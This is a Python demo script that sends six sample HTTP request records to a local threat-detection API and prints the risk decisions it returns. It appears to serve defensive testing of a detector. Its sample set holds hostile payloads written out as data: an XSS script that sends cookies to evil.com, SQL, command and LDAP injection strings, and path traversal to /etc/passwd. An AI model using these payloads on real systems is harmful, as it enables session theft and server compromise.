"""
Burp Suite E2E Demo Simulator
Simulates exactly what the Burp extension does — sends raw HTTP requests
to /analyze_raw and shows results in real-time.

Usage:
  1. Start server:  python -m uvicorn app.main:app --reload
  2. Open dashboard: http://localhost:8000/dashboard
  3. Run this:       python burp_demo.py

Watch the dashboard update live as attacks are sent!
"""

import requests
import time
import json
import sys

API = "http://localhost:8000"
USER = "burp_demo_user"

# Color codes for terminal
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

ATTACKS = [
    {
        "label": "Normal GET Request",
        "payload": {
            "user_id": USER,
            "url": "https://example.com/api/users",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0", "Accept": "text/html"},
            "body": "",
            "response_code": 200,
            "response_size": 1024,
            "response_time_ms": 45,
            "dst_port": 443,
        },
    },
    {
        "label": "SQL Injection in Search",
        "payload": {
            "user_id": USER,
            "url": "https://example.com/search?q=' OR 1=1 --",
            "method": "GET",
            "headers": {"User-Agent": "sqlmap/1.6"},
            "body": "",
            "response_code": 200,
            "response_size": 5000,
            "response_time_ms": 120,
            "dst_port": 443,
        },
    },
    {
        "label": "XSS Attack in Comment",
        "payload": {
            "user_id": USER,
            "url": "https://example.com/comment",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "comment=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "response_code": 200,
            "response_size": 800,
            "response_time_ms": 90,
            "dst_port": 443,
        },
    },
    {
        "label": "Path Traversal Attack",
        "payload": {
            "user_id": USER,
            "url": "https://example.com/download?file=../../../../etc/passwd",
            "method": "GET",
            "headers": {},
            "body": "",
            "response_code": 200,
            "response_size": 2048,
            "response_time_ms": 30,
            "dst_port": 443,
        },
    },
    {
        "label": "Command Injection",
        "payload": {
            "user_id": USER,
            "url": "https://example.com/ping",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": '{"host": "127.0.0.1; cat /etc/shadow"}',
            "response_code": 200,
            "response_size": 500,
            "response_time_ms": 200,
            "dst_port": 443,
        },
    },
    {
        "label": "LDAP Injection",
        "payload": {
            "user_id": USER,
            "url": "https://example.com/login",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "username=*)(uid=*))(|(uid=*&password=pass",
            "response_code": 200,
            "response_size": 600,
            "response_time_ms": 80,
            "dst_port": 443,
        },
    },
]


def print_banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════╗
║          BURP SUITE E2E DEMO — ATTACK SIMULATOR            ║
║                                                              ║
║  Dashboard: http://localhost:8000/dashboard                   ║
║  API:       http://localhost:8000/analyze_raw                 ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def reset_session():
    """Reset user session before demo."""
    try:
        r = requests.post(f"{API}/reset_session/{USER}")
        if r.status_code == 200:
            print(f"  {GREEN}✓ Session reset for {USER}{RESET}")
        else:
            print(f"  {YELLOW}! Could not reset session (endpoint may not exist){RESET}")
    except Exception:
        print(f"  {YELLOW}! Reset endpoint not available — continuing anyway{RESET}")


def send_attack(idx, attack):
    """Send a single attack payload and display results."""
    label = attack["label"]
    payload = attack["payload"]

    print(f"\n  {BOLD}[{idx+1}/{len(ATTACKS)}] {label}{RESET}")
    print(f"  {CYAN}URL:{RESET}    {payload['url'][:70]}")
    print(f"  {CYAN}Method:{RESET} {payload['method']}")
    if payload.get("body"):
        print(f"  {CYAN}Body:{RESET}   {payload['body'][:60]}...")

    try:
        r = requests.post(f"{API}/analyze_raw", json=payload, timeout=10)

        if r.status_code == 200:
            data = r.json()
            fusion = data.get("fusion", {})
            action = data.get("action", {})
            threat = data.get("threat_context")

            risk = fusion.get("final_risk", 0)
            decision = fusion.get("decision", "?")
            action_str = action.get("action", "?")

            # Color based on decision
            if decision == "BLOCK" or action_str == "ACCOUNT_LOCKED":
                color = RED
                icon = "🚨"
            elif decision == "MFA":
                color = YELLOW
                icon = "⚠️"
            else:
                color = GREEN
                icon = "✅"

            print(f"  {color}{BOLD}  → Risk: {risk:.3f}  |  Decision: {decision}  |  Action: {action_str} {icon}{RESET}")

            if threat:
                print(f"  {RED}  → THREAT DETECTED: {threat['attack_type']} (severity: {threat['severity']}, confidence: {threat['confidence']}){RESET}")

            net = data.get("network", {})
            if net.get("attack_type"):
                print(f"  {YELLOW}  → Network Model: {net['model']} → {net['attack_type']}{RESET}")

        elif r.status_code == 403:
            print(f"  {RED}{BOLD}  → 🔒 ACCOUNT LOCKED — Blocked by threat analyzer!{RESET}")

        elif r.status_code == 422:
            print(f"  {YELLOW}  → 422 Validation Error: {r.text[:100]}{RESET}")

        else:
            print(f"  {RED}  → HTTP {r.status_code}: {r.text[:80]}{RESET}")

    except requests.exceptions.ConnectionError:
        print(f"  {RED}  → Server not reachable! Start: python -m uvicorn app.main:app --reload{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"  {RED}  → Error: {e}{RESET}")


def main():
    print_banner()

    # Check server
    print(f"  {CYAN}Checking server...{RESET}")
    try:
        r = requests.get(f"{API}/docs", timeout=3)
        print(f"  {GREEN}✓ Server is running!{RESET}")
    except Exception:
        print(f"  {RED}✗ Server not running! Start with: python -m uvicorn app.main:app --reload{RESET}")
        sys.exit(1)

    # Reset session
    reset_session()

    print(f"\n  {BOLD}{'='*60}")
    print(f"  Open the dashboard now: http://localhost:8000/dashboard")
    print(f"  {'='*60}{RESET}")

    input(f"\n  Press ENTER to start the attack sequence...")

    print(f"\n  {BOLD}━━━ SENDING ATTACKS ━━━{RESET}")

    for i, attack in enumerate(ATTACKS):
        send_attack(i, attack)
        time.sleep(2)  # Pause between attacks so dashboard updates are visible

    print(f"""
  {BOLD}━━━ DEMO COMPLETE ━━━{RESET}

  {GREEN}✓ All {len(ATTACKS)} attacks sent!{RESET}
  {CYAN}→ Check the dashboard for the full timeline & risk graphs{RESET}
  {CYAN}→ Notice how the system escalated: ALLOW → MFA → BLOCK{RESET}

  {BOLD}Key Observations:{RESET}
  • Normal traffic was allowed through
  • SQLi/XSS were detected by signature analysis
  • After repeated anomalies, the session was locked
  • The dashboard showed everything in real-time!
""")


if __name__ == "__main__":
    main()
